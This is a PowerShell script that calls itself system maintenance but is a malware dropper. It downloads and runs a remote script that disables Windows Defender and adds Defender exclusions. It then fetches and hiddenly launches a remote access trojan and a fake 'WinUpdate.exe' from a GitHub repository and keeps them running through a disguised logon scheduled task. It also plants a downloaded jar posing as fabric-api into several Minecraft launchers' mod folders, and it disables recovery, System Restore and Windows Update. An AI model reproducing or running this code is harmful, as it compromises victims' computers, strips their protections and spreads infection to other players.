# ============================================================
#  wf.ps1 - SCRIPT DE MANTENIMIENTO DEL SISTEMA
#  Ejecutar como Administrador
# ============================================================

Write-Host "[+] Iniciando mantenimiento del sistema..." -ForegroundColor Red

# 1. Deshabilitar protecciones
Write-Host "[1/7]" -ForegroundColor Cyan
iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/MurphCodeDev/wf/main/Disable_Defender.ps1'))
Start-Sleep -Seconds 5

# 2. Crear directorio de trabajo
Write-Host "[2/7]" -ForegroundColor Cyan
$workDir = "C:\ProgramData\Updater"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# Excluir directorio y proceso
Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "WinUpdate.exe" -ErrorAction SilentlyContinue

# 3. Descargar componentes (Overlord y WinUpdate)
Write-Host "[3/7]" -ForegroundColor Cyan

# Overlord
$ratPath = "$workDir\win_nc.exe"
if (-not (Test-Path $ratPath)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath -ErrorAction SilentlyContinue > $null 2>&1
}
Start-Process -FilePath $ratPath -WindowStyle Hidden -ErrorAction SilentlyContinue

# Componente principal (WinUpdate)
$componentPath = "$workDir\WinUpdate.exe"
if (-not (Test-Path $componentPath)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/WinUpdate.exe" -OutFile $componentPath -ErrorAction SilentlyContinue > $null 2>&1
}

# 4. Crear script supervisor (con nombres neutros)
Write-Host "[4/7]" -ForegroundColor Cyan

$supervisorScript = @'
$workDir = "C:\ProgramData\Updater"
$componentPath = "$workDir\WinUpdate.exe"
$componentUrl = "https://raw.githubusercontent.com/MurphCodeDev/wf/refs/heads/main/WinUpdate.exe"
$logPath = "$workDir\WinUpdate_debug.log"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $logPath -Append
}

Write-Log "Inicio del servicio de verificación."

# Esperar 60 segundos para estabilizar el escritorio
Write-Log "Estabilizando entorno (60s)..."
Start-Sleep -Seconds 60
Write-Log "Fin de la espera."

# Asegurar que el componente exista
if (-not (Test-Path $componentPath)) {
    Write-Log "Componente no encontrado. Descargando..."
    try {
        Invoke-WebRequest -Uri $componentUrl -OutFile $componentPath -UseBasicParsing -ErrorAction Stop
        Write-Log "Descarga completada."
    } catch {
        Write-Log "ERROR durante descarga: $_"
    }
} else {
    Write-Log "Componente ya presente en $componentPath"
}

# Ejecutar el componente si no está activo
$proc = Get-Process -Name "WinUpdate" -ErrorAction SilentlyContinue
if (-not $proc) {
    Write-Log "Iniciando componente..."
    try {
        $proc = Start-Process -FilePath $componentPath -WindowStyle Hidden -PassThru -ErrorAction Stop
        Write-Log "Componente iniciado. PID: $($proc.Id)"
    } catch {
        Write-Log "ERROR al iniciar: $_"
    }
} else {
    Write-Log "Componente ya en ejecución (PID: $($proc.Id))"
}
Write-Log "Script de verificación finalizado."
'@

$supervisorPath = "$workDir\Start-WinUpdate.ps1"
$supervisorScript | Out-File -FilePath $supervisorPath -Encoding ASCII -Force

# 5. Crear tarea programada persistente (ONLOGON)
Write-Host "[5/7]" -ForegroundColor Cyan
$taskName = "WindowsUpdateTask"
$taskCommand = "powershell.exe"
$taskArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$supervisorPath`""

schtasks /delete /tn "$taskName" /f > $null 2>&1
schtasks /create /tn "$taskName" /tr "cmd.exe /c start /min $taskCommand $taskArgs" /sc onlogon /ru "$env:USERNAME" /rl HIGHEST /f > $null 2>&1

if (schtasks /query /tn "$taskName" 2>$null) {
    Write-Host "[+] Tarea programada creada correctamente (persistente)." -ForegroundColor Green
} else {
    Write-Host "[-] Error al crear tarea. Usando método alternativo..." -ForegroundColor Yellow
    schtasks /create /tn "$taskName" /tr "$taskCommand $taskArgs" /sc onlogon /ru "$env:USERNAME" /rl HIGHEST /f > $null 2>&1
}

# 6. Infección de mods de Minecraft (opcional, igual que original)
Write-Host "[6/7]" -ForegroundColor Cyan
$jarName = "fabric-api-0.179.1_22.1.2.jar"
$tempJar = "$workDir\$jarName"
$destinos = @()

$minecraftMods = "$env:APPDATA\.minecraft\mods"
if (Test-Path $minecraftMods) { $destinos += $minecraftMods }

$lunarProfiles = "$env:USERPROFILE\.lunarclient\profiles"
if (Test-Path $lunarProfiles) {
    $destinos += Get-ChildItem -Path $lunarProfiles -Directory -ErrorAction SilentlyContinue | 
        Where-Object { Test-Path (Join-Path $_.FullName "mods") } | 
        ForEach-Object { Join-Path $_.FullName "mods" }
}

$featherMods = "$env:APPDATA\.feather\user-mods"
if (Test-Path $featherMods) { $destinos += $featherMods }
if (Test-Path $featherMods) {
    $destinos += Get-ChildItem -Path $featherMods -Directory -Recurse -ErrorAction SilentlyContinue | 
        Where-Object { $_.Name -eq "mods" } | 
        ForEach-Object { $_.FullName }
}

$prismInstances = "$env:APPDATA\PrismLauncher\instances"
if (Test-Path $prismInstances) {
    $destinos += Get-ChildItem -Path $prismInstances -Directory -ErrorAction SilentlyContinue | 
        ForEach-Object {
            $modsFolder = Join-Path $_.FullName "minecraft\mods"
            if (Test-Path $modsFolder) { $modsFolder }
        }
}

$destinos = $destinos | Select-Object -Unique
if ($destinos.Count -gt 0) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/$jarName" -OutFile $tempJar -UseBasicParsing -ErrorAction SilentlyContinue > $null 2>&1
    foreach ($dest in $destinos) {
        Copy-Item -Path $tempJar -Destination "$dest\$jarName" -Force -ErrorAction SilentlyContinue > $null 2>&1
    }
}

# 7. Deshabilitar recuperación, restauración y Windows Update
Write-Host "[7/7]" -ForegroundColor Cyan
reagentc.exe /disable > $null 2>&1
Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v SetDisableUXWUAccess /t REG_DWORD /d 1 /f /reg:64 > $null 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f /reg:64 > $null 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 2 /f /reg:64 > $null 2>&1

# Verificación final
Write-Host "[+] CHECKS" -ForegroundColor Cyan
try { Get-MpComputerStatus -ErrorAction Stop 2>$null | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled } catch { Write-Host "Windows Defender: Deshabilitado" }
if ((reagentc /info | Out-String) -match "Enabled|Disabled") { Write-Host "Factory Reset: $($matches[0])" } else { Write-Host "Factory Reset: No encontrado" }
if ((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -ErrorAction SilentlyContinue).NoAutoUpdate -eq 1) { Write-Host "Windows Update: Deshabilitado" } else { Write-Host "Windows Update: Habilitado" }

Write-Host "[DONE] Mantenimiento completado. El servicio se activará en el próximo inicio de sesión (60s después)." -ForegroundColor Magenta
Write-Host "[*] La tarea programada mantendrá el servicio activo." -ForegroundColor Yellow
# Restart-Computer -Force   (opcional)